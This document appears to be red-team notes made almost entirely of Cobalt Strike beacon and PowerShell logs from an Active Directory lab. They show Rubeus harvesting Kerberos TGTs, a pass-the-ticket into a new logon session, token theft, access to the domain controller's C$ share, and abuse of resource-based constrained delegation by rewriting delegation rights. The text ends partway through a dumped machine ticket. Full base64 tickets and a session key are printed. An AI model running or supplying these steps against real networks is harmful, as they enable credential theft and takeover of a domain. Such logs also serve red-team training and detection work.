<img width="1091" height="273" alt="image" src="https://github.com/user-attachments/assets/853cf2dc-a7f9-46a5-b5fc-fd47e2a772fe" />

```powershell
[12/07 12:39:35] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
[12/07 12:39:40] [+] host called home, sent: 577818 bytes
[12/07 12:39:42] [+] job registered with id 0
[12/07 12:39:42] [+] [job 0] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: TGT Monitoring
[*] Monitoring every 60 seconds for new TGTs


[*] 07/12/2025 12:39:41 UTC - Found new TGT:

  User                  :  dyork@CONTOSO.COM
  StartTime             :  07/12/2025 12:38:45
  EndTime               :  07/12/2025 22:38:45
  RenewTill             :  14/12/2025 12:38:45
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjjCCBYqgAwIBBaEDAgEWooIEmTCCBJVhggSRMIIEjaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBFMwggRPoAMCARKhAwIBAqKCBEEEggQ9noyVlWc5KmuLtTlFCLTmUJGniwuSFvIHk4FbUgrEQf2FmSgQg7fujF4kifVarvTP4raGbcOPP0zbMmZbPC6D7u4Oi+GHTEG4/7yGiLzgLjVHC/w15T9+UzGdtqFqBJ3/tUw3/Hrt43JnCuwwuSuGjxR9N0ReojBy9lYMayGSBEk+i6nIDaQOt259S6/LQsTMxgFKvtkQ9VTDHY9furWLyVS8VvYY/NbeCSvbDBTgF5J66+Eq5p2pZIcZN96mQWFe9XhD5d0gWQdi9Mhz353cSk3QN8m37S8NXVy9Weta6ZgZSuX+53IDBRVUWUbjA/FDXi3G46j3nPEvO9W3Qw+ILv3NKWQV+TNjROWc+BbDMVrFMAKEvnz3hISTln4bfISgF34Q46oh92rVEeLifQEzTBP8kLU+kmB8ZfD7upU+aKxl5aan2VRtpOPlxErpoX+YSNB188YE3wuUzyJAAPo5o2wbAW1IJnmDZTUXMEF8BfncAirr7rRTFt0aaC1ci7mz1gFe+QcQnr5EhTwohDNjEpDleEYEfcEvNSPCXYO2gpnYiaTBSMo4JUtiVQvSCCcEwy0/XMH7FNBwUHg030QiiR/vxH18xlE/wxi5i2IatodYyTf2eQPYWnXOoltPJZAyq4DevddEJ20qF4PcMUHhIp/D7pB6NcLkIyqr+ePwFSZ6fVXg9YWENYXY9jHR2YJdbDvCxrdddCWaph5GOewRCRCy0K+JTc4A+KmGzcpFzYeECWdWpiEb1BJnCj2A67+oINCsrdsK6HLx+4Q+dS0sUB28itXGcBQNQC6zlhVBNKatgDScS1E2lTilf1PDzARBtL979RzkZk7wCvtPDHgWWLSO+qqyJbS/MjJaPP0HjCmE9IaihpUBNkkPXgUMIL0awYdS+N0Y2mVt4vpeNm6j/04vkJGdnu+cujxtYufAQXIb69axO6DZmmTg2Dk6t2p5ExP5OUNs7isghgIiRsEqwpwo0V7Ij3wf8pEQOCisojrsvfjhGMyEg8fficzVjZRdGBVGG4l+vUR6T+mgGa1IUI0UmgDdNawh84oG625U7xrcU/oVhmRnEEg2CI+6KJRhxLeWEqv9DeIs1RbSvj73k8hcFIi14pdS72rbvUOFVTL6vPX0xaLfKcmoX/DxOh4/q6LjwTahANu1n2reZqecJX71lkwPX5t6xO8VYFE4Nzb7xwvAhpTnc9uGboJ+ybhOqkJu684phFO3//+TKUSTl6SkWD/7bNqr2i5xeSlc9RAnP1aqce31dARGetgfrNorGE4bWWkBE24gGRDkuHeSFD0vEidnQZ05HiFSYC1mjn+0lPfxSgliI4BWaVuYtpV/d6KzHqssidU+vtzbLJDBTkSd+AsxUqt5aIJlOAIrBCQ67f6xMfnekUPW2MrzT/MONZzE43trnKW6KGPapF5pA3JbvL0hCxkCIFMYV5mjgeAwgd2gAwIBAKKB1QSB0n2BzzCBzKCByTCBxjCBw6ArMCmgAwIBEqEiBCB+V1lShsv3VUFKptddAfqZpE31hA6o+97AToyGhEkuV6ENGwtDT05UT1NPLkNPTaISMBCgAwIBAaEJMAcbBWR5b3JrowcDBQBgoQAApREYDzIwMjUxMjA3MTIzODQ1WqYRGA8yMDI1MTIwNzIyMzg0NVqnERgPMjAyNTEyMTQxMjM4NDVaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==


[*] 07/12/2025 12:39:42 UTC - Found new TGT:

  User                  :  LON-WS-1$@CONTOSO.COM
  StartTime             :  07/12/2025 12:39:42
  EndTime               :  07/12/2025 22:31:51
  RenewTill             :  14/12/2025 12:31:51
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBE8wggRLoAMCARKhAwIBAqKCBD0EggQ5SSSEOWMN2PKV/H2719yzPCiBxrKJidy7pT+0gGWtzwNwfCp2O9H0qhavmv8ToMRyCSOwChpUSYXrDdNxqH0K+b+bw2youLKQJXwqpThKlcGBeg3ORRv6VKdKte6beJjlkoas0QgngPPpzhrtY+o5LmlO/Izy15Zhk82dvceSmvsnuF59m8KUHbdtvb8Rjh3BemPF0RwhxCCemdeNU7k9ZO2DcABJHTRQJRknK1Wa+UOI6tGDL5i/1SAeoNPEqsevt6B8Nm7VanVT8cJqg3jqvHH5GZxpoI/hDSZ8Jutl0bypsb67P1kMCSfJ/geN6Of01hS0Fi9ccCbwsskgaVoI/SXVEN9BfgSiLZeopEBzA1liB3XfggJjYChKjXpC/zQLqUWU3NABKX4JIQc2uMjoaNca2P5PDjZxG3jaf+Cb/VMkFtAq/3tajUKpoTsx5d2dlcBg9PgJrq9HYKE8svglTN16+HNSBwY9IO1diY1RA8JSzLabjNIpIeb1LTMqy0PMEGIV6hF6mZ+t4dSgrdso44GyaVzj1E8+MS8+y8kAGzs8g+uc/j/a5DmdUVgqrZ9uFCruulOAyahlFO4bEAVIG/LoDgYE5bax1A163yhRzyt6jDLsb2UtRZmjRgvuLAjgtVGJwvuGgCZ6hbpobJCKDgKzs/w+85+6+2FSuZVF3z800y3GA0vWEab/SDoFve3SvUgsNGBVbpYamLhbL1zL6AbRIW1xlAcnUb0q3ebX43hSLnF9VnOCa0VFF/cjmdRnqsgXprU8Z7H41YcqLXLjBfedji88kF3YE17wwERqG58JVZ+mQzB06DhipEx0aPlsE519c06G2YYSw83XYaV/92idZ8ZqqHDrELRi/2xuluSqbE7OBwNHGew7aJ0SSvA5vuB2rXXMJemvSZ5Te/5k+9rSDn7qDIg9lDrxuzWupcz9G1mG0J/KWUicSkhwZJzmQCPiL+osVG61yRw1rXSff+Bbhgxk6vLXqNqKPbIdoTbG1kgwcbbm526VPvaFcdxy7rE7QDXPn5dXQLNbQ4AAkpdQZ4nNqaJvitZ/LXWiEMpXbtTKMszEue2uwMDsyFcamWLIzlsjQfu0nFaY/JLV+DY9hiz1ap1nwstd8buO0KeUwVwc00GBa7DQykJMSQPvG11Ym7k8tblahMH1V9pdkqBOHSfv6idBu5b6XGDlDnSIIkM+4XyMBYJgtP0dAWz2Z6JFV2tZmElSKv+K32IGSAjxSfM01ENojaYspVtyFMnxGavU9pCcDyIDgnjsA8BykosbU6Onf9NORYf2bG8uMLA4c2yjXSkkoUhcL/DXx7nSymI4Y3QDwJ3pLheuflIQkJllSTUgJpXeYxByUyHO9ZzIsaEYF7qqtZX4ppFhKhIyokPTOYdp/xgof0IcrfLJNi42uqAXrWUF9KpwH8RdJkYN8OVju4M9mKOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEEOzPQIp+xCQfADls5HJQRvShDRsLQ09OVE9TTy5DT02iFjAUoAMCAQGhDTALGwlMT04tV1MtMSSjBwMFAGChAAClERgPMjAyNTEyMDcxMjM5NDJaphEYDzIwMjUxMjA3MjIzMTUxWqcRGA8yMDI1MTIxNDEyMzE1MVqoDRsLQ09OVE9TTy5DT02pIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NPTlRPU08uQ09N


[*] 07/12/2025 12:39:42 UTC - Found new TGT:

  User                  :  rsteel@CONTOSO.COM
  StartTime             :  07/12/2025 12:37:10
  EndTime               :  07/12/2025 22:37:10
  RenewTill             :  14/12/2025 12:37:10
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFqDCCBaSgAwIBBaEDAgEWooIEsjCCBK5hggSqMIIEpqADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBGwwggRooAMCARKhAwIBAqKCBFoEggRWFjyzteJtds4z8On6ksSUpbwOe/mhLuBkAxUV7z9XKnf/qFJdt7b7P/1JxtEFAC/0OnnN6Q1UwprkOnKMPWk+jxcSFxc+a0ctbDw137Fr14e1/j60jmCoPk43i3UZH5lIDc9tZrNr6Mdl3HoKY8pPwZ2obXOZH586L5F7H0HVSmowBYotNaKdMR1u1nJopGeC+O1oi2whYBu+aTXnhcpJXNDqEo1Ivkg7AdmsyA3OA2Tzw6yLhTNQEStcI5K1ViWHugyDZK2TKwDzbPR4GU6s4YZicF470UtBPtTbTq/HIpZO1gAl4rALEur3pZgZ3WqtRCR2XtrfagtFuEeGPajwUuFHupPW6ZENXfyjOOuvTqWoUFq5tBgt2TAKWB95gj8aW2esNlCe79XlisUxUDBCmf+pSysZsvy5B3XPWX97M1jVBRfDP/Tb7v+s3OV8uGXlzAHl//OZXyfL5n2JKlAlEJmqzWV3zHkOgeymAJ9OyPn2/Vu8cjerEaCnuhbaDvHqyi0EubkPQtvPc3hq8WDdsVivWJGw97RadkXTe33wdFpk27PQwcV7JgwDn5vd/Ir/wZJRKFSpYRuOB7XZz3TJIDW0KcrJ32rbxNMjDJwXP85aXiStO4HFVflu9oLzdAuslioHCJzJgFRlUCpX+je17tDzpyn8xR190l2CF41//o80CQUNO+Ujnxh2AMQX9emgJc3a5quAon9v6P1N5SpDbRNQszEA7S1F0i5PL2vlACJZmww4H59WfWYtmG6HDtvvKOxuB5jrPAjcHojcYpIprj1qCkyFRifMN5EG1QMRckAcgVPGKJatr98fwqjHPg6g4HlaqsAEVaU0zKEPQPuarHn8rWeflOVwbMYQq/fuBdMcf2IRucnTHI7GQaVSfz3CWVRTzzFf2PMRai8HDQMWITY8AzAREBLw/ASimDMJdCUKISEFXktkMWLaaGWCNxn11cU7aqpRjQ0spgicOSJ4pgFs6XIAp0+W+BC/LFR9AxRdzMdf5AnAGTE26RCquxR2KTe539uRcSoSRHFQqK7PE7z3nwbrZn751hpCyN0hz6DnVJiAN+x3jeDwmapTwDgabYfOwtTxOpvzjB7XLbGdOMHbgHul+yB0kK+GUiwUWHmfQTxnVH57aPF94U9k8nTPggau1SjKVnnQeY0GRr75UZfUCaollIUHAR5wJ9zwfJdmqd+sO9KP4TOUDO/fyQwB402+lmsnspOl78HYB4as0OV0l/Qo1KeCmIUXT5yCDtT2DxYybMgPaqPRV3sbNSxVFxgi6oUpq+j1T4Tfo6yJ7GzAHUk9t3sod/T2REepefq5G/nx40ruDd89VLlDeaTtYJwtDNce8S+U9xQ+atreH22GiSuzD++Dc0GvOxbHSJimz5+NtTn4Xrt5Iwo05VVGFhqFcIMAV0t4mYuZj1bSVq5cUXcPlXTJb7oMKmRzS6jQpSBj2N+O2SRoHifLMBKkn0NSiv0eo4HhMIHeoAMCAQCigdYEgdN9gdAwgc2ggcowgccwgcSgKzApoAMCARKhIgQgSDNEVVhC+oiBGMdmy25QKouMG/vy6eAaa0aYu10naSChDRsLQ09OVE9TTy5DT02iEzARoAMCAQGhCjAIGwZyc3RlZWyjBwMFAGChAAClERgPMjAyNTEyMDcxMjM3MTBaphEYDzIwMjUxMjA3MjIzNzEwWqcRGA8yMDI1MTIxNDEyMzcxMFqoDRsLQ09OVE9TTy5DT02pIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NPTlRPU08uQ09N


[*] 07/12/2025 12:39:42 UTC - Found new TGT:

  User                  :  LON-WS-1$@CONTOSO.COM
  StartTime             :  07/12/2025 12:39:42
  EndTime               :  07/12/2025 22:32:44
  RenewTill             :  14/12/2025 12:32:44
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBE8wggRLoAMCARKhAwIBAqKCBD0EggQ5w+U5fjVHm6ADTO/Nx964yO8YMAvZSXYEGCGRkX53RyrynY2coTZ+F5O6JlLbzY1K9/WKpi6e7WY3Pn9D3MeMTo637luwyNI1IaZPk3VlgADYL6pofjAm/OktqgYW8UJKML5nvNIlD4ZfwNDCtDY1n2SXpP7Rkl423EL1Ze8dK7eVfNq1GTvs2XA4lK7jt58pA4eJ2i4sjMiJ5APUVSbB7C+RzbfRXrkpI6LLKUAZm7vNtyEul0o5G/sexEarOO5UaiK46NCpLSSIDNAII8PB9zDKxqaTySFOhXpdBYmJaNqVyt//HBCm6ee25YaiwN2ZfN+S6dE0vY8zb67UE/AEl3PHF4aYnHp/rXUtUxQShPkxcD2arR1yLjeD5qDAN2rvJJIsFlpmfgQfi7y3C48P2mCjS7Q1kBP6qKs9aFF580aGgH0JVkTlhlcfWDh/gERtbIMq4iiukTSfywHp72oPqllsAVhBSvn2zowKsAdBUHjns2iGFVh/zGd2BTVxsObNESFTSvZwyhF7hjrQAUfQo2q6RUM5juVRtVks++fvAVl4qZhs92eNewGiNiXhRkhTpdE3RfbM04Njx6Q95FbSC4K0wWaE46Y3GdohkMuzVISpVqEd3HqcP4CKhmpoeMu/OeHAtp737iIF12DIVTBNCVZjSNwbViAu2SzxiYJfiqc1qswjbyDkmXgLvWfZKITyFVO08oTmLmpdXC4JgvUFhiCncKvA3Ixq7Uz9lzexDolJXPG6ntU8DzDLFFAfgipPC+hJIaakoaaMWUzb1Xy+5pkjEBuHVAv+/U8Lt7kpvTv35euEa1cJrjHMKZARyErhTlnS++RcxR/KrE3dkQw3tbw3mitULLUp/vKCtrpDqV3JkUL8pPkagdNuwUviHgWw1qP1+TFnVRadxvm1eb/cyq86Jg8kogKpnqeLNKUBMqwP9JSH4eyU0zIpo8w3pECItY1CaViaHdCg2HlDyszhFpJ514ixSUKhu6W8rBUzZUcF8erUbkXZQuvI6a9HxyBas/Gq8JwJ+vumbRkB8jJ2v0IkwSHsHgVbXz7wL0t9FupFDFz5epKHHjcO6stjiwjg6dVK0BOAlhBoZFDnQQh3jLPi3mBHxWNG723e39VTYeCfrbkNLXTKjZ3fiLPZWNFY+jXBMrleZLmAZJWsl5iNJP2YhAQHaXhhrgxZuQ2VYryE5egu5zjVwLVFumGopsjlDlK2bCpH9cmC8uFD6n8pstLc2hYhBdgR4cuVANH9p8GGoXfaBpAH+ZghJvUhdCHmDF7Y4duhxrOX+/weogW+pARg7Z750WPj3xUelIzyDtARy2Op/DoIgyrKCT1t4e0tJaTJsFzwmW2kTZntCp38NFlBjyDQRPPxJM4AYrVXFsz7zzU/5l+Qa9CO2GTvOhf4SjZ7kwdgeucVqswoy1UBzWuNvnVAWweh/qOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEELHgtiE4A7dMMbt9MJLJkZWhDRsLQ09OVE9TTy5DT02iFjAUoAMCAQGhDTALGwlMT04tV1MtMSSjBwMFAGChAAClERgPMjAyNTEyMDcxMjM5NDJaphEYDzIwMjUxMjA3MjIzMjQ0WqcRGA8yMDI1MTIxNDEyMzI0NFqoDRsLQ09OVE9TTy5DT02pIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NPTlRPU08uQ09N

[*] Ticket cache size: 4
```

```powershell
[12/07 12:40:54] beacon> jobs
[12/07 12:40:54] [+] host called home, sent: 8 bytes
[12/07 12:40:54] [*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    1240  .NET assembly
```

```powershell
[12/07 12:41:01] beacon> jobkill 0
[12/07 12:41:01] [+] host called home, sent: 10 bytes
[12/07 12:41:01] [+] job 0 completed
```

```powershell
[12/07 12:45:46] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:doIFjjCCBYqgAwIBBaEDAgEWooIEmTCCBJVhggSRMIIEjaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBFMwggRPoAMCARKhAwIBAqKCBEEEggQ9noyVlWc5KmuLtTlFCLTmUJGniwuSFvIHk4FbUgrEQf2FmSgQg7fujF4kifVarvTP4raGbcOPP0zbMmZbPC6D7u4Oi+GHTEG4/7yGiLzgLjVHC/w15T9+UzGdtqFqBJ3/tUw3/Hrt43JnCuwwuSuGjxR9N0ReojBy9lYMayGSBEk+i6nIDaQOt259S6/LQsTMxgFKvtkQ9VTDHY9furWLyVS8VvYY/NbeCSvbDBTgF5J66+Eq5p2pZIcZN96mQWFe9XhD5d0gWQdi9Mhz353cSk3QN8m37S8NXVy9Weta6ZgZSuX+53IDBRVUWUbjA/FDXi3G46j3nPEvO9W3Qw+ILv3NKWQV+TNjROWc+BbDMVrFMAKEvnz3hISTln4bfISgF34Q46oh92rVEeLifQEzTBP8kLU+kmB8ZfD7upU+aKxl5aan2VRtpOPlxErpoX+YSNB188YE3wuUzyJAAPo5o2wbAW1IJnmDZTUXMEF8BfncAirr7rRTFt0aaC1ci7mz1gFe+QcQnr5EhTwohDNjEpDleEYEfcEvNSPCXYO2gpnYiaTBSMo4JUtiVQvSCCcEwy0/XMH7FNBwUHg030QiiR/vxH18xlE/wxi5i2IatodYyTf2eQPYWnXOoltPJZAyq4DevddEJ20qF4PcMUHhIp/D7pB6NcLkIyqr+ePwFSZ6fVXg9YWENYXY9jHR2YJdbDvCxrdddCWaph5GOewRCRCy0K+JTc4A+KmGzcpFzYeECWdWpiEb1BJnCj2A67+oINCsrdsK6HLx+4Q+dS0sUB28itXGcBQNQC6zlhVBNKatgDScS1E2lTilf1PDzARBtL979RzkZk7wCvtPDHgWWLSO+qqyJbS/MjJaPP0HjCmE9IaihpUBNkkPXgUMIL0awYdS+N0Y2mVt4vpeNm6j/04vkJGdnu+cujxtYufAQXIb69axO6DZmmTg2Dk6t2p5ExP5OUNs7isghgIiRsEqwpwo0V7Ij3wf8pEQOCisojrsvfjhGMyEg8fficzVjZRdGBVGG4l+vUR6T+mgGa1IUI0UmgDdNawh84oG625U7xrcU/oVhmRnEEg2CI+6KJRhxLeWEqv9DeIs1RbSvj73k8hcFIi14pdS72rbvUOFVTL6vPX0xaLfKcmoX/DxOh4/q6LjwTahANu1n2reZqecJX71lkwPX5t6xO8VYFE4Nzb7xwvAhpTnc9uGboJ+ybhOqkJu684phFO3//+TKUSTl6SkWD/7bNqr2i5xeSlc9RAnP1aqce31dARGetgfrNorGE4bWWkBE24gGRDkuHeSFD0vEidnQZ05HiFSYC1mjn+0lPfxSgliI4BWaVuYtpV/d6KzHqssidU+vtzbLJDBTkSd+AsxUqt5aIJlOAIrBCQ67f6xMfnekUPW2MrzT/MONZzE43trnKW6KGPapF5pA3JbvL0hCxkCIFMYV5mjgeAwgd2gAwIBAKKB1QSB0n2BzzCBzKCByTCBxjCBw6ArMCmgAwIBEqEiBCB+V1lShsv3VUFKptddAfqZpE31hA6o+97AToyGhEkuV6ENGwtDT05UT1NPLkNPTaISMBCgAwIBAaEJMAcbBWR5b3JrowcDBQBgoQAApREYDzIwMjUxMjA3MTIzODQ1WqYRGA8yMDI1MTIwNzIyMzg0NVqnERgPMjAyNTEyMTQxMjM4NDVaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==
[12/07 12:45:51] [+] host called home, sent: 581824 bytes
[12/07 12:45:52] [+] job registered with id 2
[12/07 12:45:52] [+] [job 2] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Create Process (/netonly)


[*] Using CONTOSO.COM\dyork:FakePass

[*] Showing process : False
[*] Username        : dyork
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4968
[+] Ticket successfully imported!
[+] LUID            : 0x11b5a5

[12/07 12:45:53] [+] job 2 completed
```

```powershell
[12/07 12:46:46] beacon> steal_token 4968
[12/07 12:46:46] [+] host called home, sent: 12 bytes
[12/07 12:46:47] [+] Impersonated NT AUTHORITY\SYSTEM
```

```powershell
[12/07 12:47:11] beacon> run klist
[12/07 12:47:12] [+] host called home, sent: 23 bytes
[12/07 12:47:12] [+] job registered with id 3
[12/07 12:47:12] [+] [job 3] received output:

Current LogonId is 0:0x11b5a5

Cached Tickets: (1)

#0>	Client: dyork @ CONTOSO.COM
	Server: krbtgt/CONTOSO.COM @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 12/7/2025 12:38:45 (local)
	End Time:   12/7/2025 22:38:45 (local)
	Renew Time: 12/14/2025 12:38:45 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 

[12/07 12:47:12] [+] job 3 completed
```

```powershell
[12/07 12:47:38] beacon> ls \\lon-dc-1\c$
[12/07 12:47:38] [+] host called home, sent: 31 bytes
[12/07 12:47:39] [*] Listing: \\lon-dc-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 08:20:24   PerfLogs
          dir     04/11/2025 12:01:00   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     04/11/2025 10:57:21   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     04/11/2025 10:54:00   Windows
 12kb     fil     12/07/2025 03:30:34   DumpStack.log.tmp
 1gb      fil     12/07/2025 03:30:34   pagefile.sys
```

```powershell
[12/07 12:48:07] beacon> rev2self
[12/07 12:48:07] [+] host called home, sent: 8 bytes
```

```powershell
[12/07 12:48:45] beacon> kill 4968
[12/07 12:48:45] [+] host called home, sent: 12 bytes
```

## RBCD
### Detection
```powershell
PS C:\WINDOWS\system32> $Cred = Get-Credential CONTOSO\rsteel
```

```powershell
PS C:\WINDOWS\system32> Get-DomainComputer -Server 'lon-dc-1' -Credential $Cred | Get-DomainObjectAcl -Server 'lon-dc-1' -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier

ObjectDN                                        SecurityIdentifier
--------                                        ------------------
CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com S-1-5-21-3926355307-1661546229-813047887-1107
CN=LON-FS-1,OU=Member Servers,DC=contoso,DC=com S-1-5-21-3926355307-1661546229-813047887-1107
CN=LON-DB-1,OU=Member Servers,DC=contoso,DC=com S-1-5-21-3926355307-1661546229-813047887-1107
CN=LON-DB-2,OU=Member Servers,DC=contoso,DC=com S-1-5-21-3926355307-1661546229-813047887-1107
CN=LON-CS-1,OU=Member Servers,DC=contoso,DC=com S-1-5-21-3926355307-1661546229-813047887-1107
```

```powershell
PS C:\WINDOWS\system32> Get-ADGroup -Filter 'objectsid -eq "S-1-5-21-3926355307-1661546229-813047887-1107"' -Server 'lon-dc-1' -Credential $Cred


DistinguishedName : CN=Server Admins,CN=Users,DC=contoso,DC=com
GroupCategory     : Security
GroupScope        : Global
Name              : Server Admins
ObjectClass       : group
ObjectGUID        : 5ceea890-d8b7-47f3-918f-f6d3d040d70a
SamAccountName    : Server Admins
SID               : S-1-5-21-3926355307-1661546229-813047887-1107
```

```powershell
PS C:\WINDOWS\system32> Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name     PrincipalsAllowedToDelegateToAccount
----     ------------------------------------
LON-DC-1 {}
LON-WS-1 {}
LON-FS-1 {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com}
LON-W... {}
LON-W... {}
LON-DB-1 {}
LON-DB-2 {}
LON-CS-1 {}
```

### Exploitation
```powershell
PS C:\WINDOWS\system32> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1' -Credential $Cred
PS C:\WINDOWS\system32> $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1' -Credential $Cred
PS C:\WINDOWS\system32> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1' -Credential $Cred
```

```powershell
PS C:\WINDOWS\system32> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name     PrincipalsAllowedToDelegateToAccount
----     ------------------------------------
LON-FS-1 {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com, CN=LON-WKSTN-1,OU=Workstations,DC=contoso,DC=com}
```

```powershell
[12/08 12:47:25] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
[12/08 12:47:31] [*] Tasked beacon to run .NET program: Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
[12/08 12:47:31] [+] host called home, sent: 577868 bytes
[12/08 12:47:49] [+] job registered with id 0
[12/08 12:47:49] [+] [job 0] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x3e7
[*] Current LUID    : 0x3e7

  UserName                 : LON-WKSTN-1$
  Domain                   : CONTOSO
  LogonId                  : 0x3e7
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Negotiate
  LogonType                : 0
  LogonTime                : 08/12/2025 03:18:49
  LogonServer              : 
  LogonServerDNSDomain     : contoso.com
  UserPrincipalName        : LON-WKSTN-1$@contoso.com


    ServiceName              :  krbtgt/CONTOSO.COM
    ServiceRealm             :  CONTOSO.COM
    UserName                 :  LON-WKSTN-1$ (NT_PRINCIPAL)
    UserRealm                :  CONTOSO.COM
    StartTime                :  08/12/2025 12:47:49
    EndTime                  :  08/12/2025 22:19:27
    RenewTill                :  15/12/2025 12:19:27
    Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType                  :  rc4_hmac
    Base64(key)              :  T4IJoqr8n5OgnivuTqLzQA==
    Base64EncodedTicket   :

      doIFjDCCBYigAwIBBaEDAgEWooIEoDCCBJxhggSYMIIElKADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBFowggRWoAMCARKhAwIBAqKCBEgEggREbsU6+ppNupK/QElA7kDLH/xq9rILKodc3FWBztnSyJgXX58NGIxNMckkPH1wrV6X+ZDoS3MdPZlzFktfA+/j6QjBf+M6aSoKOlV15NZx/CiN+dFK9djYlhg1H9DfTO95f1d0KLNPgMx/3O/WyCI4cBshN/82vwbUW7Ub34yWkcjfMUSFgBZmJcpvcRbY97pjb0FdEv7HajBNLE1fLh7d6wQ5IgPnghHKjaXl+V5x19vWJw5gJA44tHol2JKsK33UrquW5ukEy2d+uLn2Evzxzaislz4s/SdMDlEFK+UIwfLPEqJ5wap0KeYWxHntjfpw8w5HE/EvsLHNLYawTEWKzZo11yE+PjFVi7/Pg/rNOqXFGtTxC3b72dzf8ujMAUxBKWczl+vUpU5kFlOvvvhsw/JbHBW6dNeln1vOhMNBeWzGq/RAQDLvniAtc/K6dm+sOm6hmMbYmFmdnprYzs7hGST5li/D97LhbqNAn/qi/2ThS9A37yMI6ziVE5egGvscilGuyv+WtlH7/YFGJ9aKJy7Sl0jaVD5npDumfGFsewsHIugSB7tEDLkwCdHXMhY7/fmq1CM3jZ7+xsWjjklJPMGdM7suc5nWqpTeF2dWZWKbS9Zm9zZeYjLMC/lFjE0s1pEdSWIqYm0QLdpABIsDYyWawvKXk3kzSwANf27+jjd4KaB5Eq0csn5B78sANRpf+N6AY1Cr1Cz5CubXDjRi3X3EM37d1qJ04vIg4/Dsm56cCGIWarLWX2/JatHq7BWT